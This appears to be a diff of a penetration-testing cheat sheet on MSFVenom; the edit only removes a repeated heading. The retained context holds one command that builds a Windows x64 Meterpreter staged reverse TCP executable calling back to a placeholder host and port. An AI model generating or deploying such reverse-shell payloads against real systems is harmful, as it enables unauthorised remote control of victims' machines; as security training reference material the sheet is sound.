@@ -1,7 +1,5 @@
 # MSFVenom
 
-# MSFVenom
-
 #### Windows Meterpreter Staged Reverse TCP (x64)
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<port> -f exe -o reverse.exe`
 
